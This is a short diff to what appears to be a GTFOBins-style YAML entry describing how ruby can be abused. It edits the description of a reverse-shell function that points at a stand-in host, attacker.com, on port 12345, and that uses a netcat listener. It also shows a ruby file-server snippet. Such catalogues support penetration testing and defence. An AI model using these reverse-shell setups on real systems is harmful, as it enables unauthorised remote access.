@@ -10,7 +10,7 @@ functions:
         export LPORT=8888
         ruby -run -e httpd . -p $LPORT
   reverse-shell:
-    - description: Run `nc -l -p 12345` to receive the shell on the other end.
+    - description: Run `nc -l -p 12345` on the attacker box to receive the shell.
       code: |
         export RHOST=attacker.com
         export RPORT=12345
